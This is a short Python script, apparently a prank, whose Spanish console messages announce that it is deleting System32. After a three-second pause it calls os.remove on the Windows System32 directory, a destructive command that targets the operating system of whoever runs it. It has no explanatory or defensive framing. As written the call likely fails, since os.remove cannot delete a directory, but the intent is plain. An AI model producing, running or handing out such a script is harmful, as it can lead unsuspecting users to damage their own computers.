import os 
from colorama import *
import time

os.system("title" + "Eliminando el System32")
print(f"{Fore.RED}Eliminando System32...{Fore.RESET}")
print(f"{Fore.GREEN}Empezando...{Fore.RESET}")
time.sleep(3)

os.remove("C:\Windows\System32")
